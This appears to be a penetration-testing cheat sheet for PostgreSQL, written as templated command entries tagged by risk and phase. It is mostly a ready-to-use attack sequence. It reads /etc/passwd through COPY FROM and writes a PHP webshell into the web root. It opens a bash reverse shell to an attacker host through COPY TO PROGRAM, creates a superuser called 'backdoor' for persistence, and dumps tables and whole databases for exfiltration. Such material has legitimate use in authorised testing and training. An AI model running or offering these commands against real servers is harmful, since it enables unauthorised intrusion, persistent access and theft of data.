# PostgreSQL
> PostgreSQL database enumeration, file operations, and command execution via COPY
<!-- tags: postgresql,postgres,database,sql,enumeration,exploit -->

---

## connect authenticated
Authenticate to a remote PostgreSQL instance.

```bash
psql -U {{USERNAME:str}} -d {{DATABASE:str:postgres}} -h {{TARGET:ip}}
```

<!-- meta: risk=low | phase=enum | tags=postgresql,connect -->

---

## connect uri string
Use PostgreSQL connection URI format.

```bash
psql postgresql://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:5432}}/{{DATABASE:str}}
```

<!-- meta: risk=low | phase=enum | tags=postgresql,uri,connect -->

---

## show server version
Display server version for CVE matching.

```bash
SHOW SERVER_VERSION;
SELECT version();
```

<!-- meta: risk=safe | phase=enum | tags=postgresql,version -->

---

## list databases roles
Enumerate databases and user roles on server.

```bash
\l
\du
SELECT rolname FROM pg_roles;
```

<!-- meta: risk=safe | phase=enum | tags=postgresql,databases,roles -->

---

## list schemas tables
Show schemas and tables in current database.

```bash
\dn
\dt
SELECT schema_name FROM information_schema.schemata;
SELECT table_schema, table_name FROM information_schema.tables ORDER BY 1,2;
```

<!-- meta: risk=safe | phase=enum | tags=postgresql,schemas,tables -->

---

## describe table columns
View column types and lengths.

```bash
\d {{TABLE:str}}
SELECT column_name, data_type, character_maximum_length FROM information_schema.columns WHERE table_name = '{{TABLE:str}}';
```

<!-- meta: risk=safe | phase=enum | tags=postgresql,schema,describe -->

---

## switch postgres os user privesc
Become the postgres OS user when local access exists.

```bash
sudo su - postgres
psql
```

<!-- meta: risk=low | phase=enum | tags=postgresql,local,privesc -->

---

## read file copy from
Read arbitrary file from server filesystem.

```bash
CREATE TABLE temp_table(content text);
COPY temp_table FROM '/etc/passwd';
SELECT * FROM temp_table;
DROP TABLE temp_table;
```

<!-- meta: risk=high | phase=post | tags=postgresql,file-read,lfi -->

---

## write webshell copy to
Write attacker-controlled content to server filesystem.

```bash
COPY (SELECT '<?php system($_GET[c]); ?>') TO '/var/www/html/shell.php';
```

<!-- meta: risk=critical | phase=exploit | tags=postgresql,file-write,webshell -->

---

## exec command copy program rce
Execute OS commands through COPY TO PROGRAM (PostgreSQL 9.3+).

```bash
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}} 0>&1';
```

<!-- meta: risk=critical | phase=exploit | tags=postgresql,rce,reverse-shell -->

---

## create superuser backdoor
Create new superuser role for persistent access.

```bash
CREATE USER {{USERNAME:str:backdoor}} WITH PASSWORD '{{PASSWORD:str:Pwn3d!}}' SUPERUSER;
```

<!-- meta: risk=critical | phase=post | tags=postgresql,backdoor,persistence -->

---

## grant privileges database
Grant connect/all privileges to a user on a database.

```bash
GRANT ALL PRIVILEGES ON DATABASE {{DATABASE:str}} TO {{USERNAME:str}};
GRANT SELECT, UPDATE, INSERT ON ALL TABLES IN SCHEMA public TO {{USERNAME:str}};
```

<!-- meta: risk=high | phase=post | tags=postgresql,grants -->

---

## export table csv exfil
Dump a table contents to CSV for exfil.

```bash
\copy {{TABLE:str}} TO '{{OUTFILE:file:table.csv}}' CSV
```

<!-- meta: risk=med | phase=post | tags=postgresql,csv,exfil -->

---

## dump database pg_dump exfil
Backup entire database for offline analysis.

```bash
pg_dump -h {{TARGET:ip}} -U {{USERNAME:str}} {{DATABASE:str}} > {{OUTFILE:file:dump.sql}}
```

<!-- meta: risk=high | phase=post | tags=postgresql,pg_dump,exfil -->

---

## run sql script remote
Execute a script file against remote PostgreSQL host.

```bash
psql -U {{USERNAME:str}} -d {{DATABASE:str}} -h {{TARGET:ip}} -f {{SCRIPT:file:script.sql}}
```

<!-- meta: risk=med | phase=exploit | tags=postgresql,scripting -->
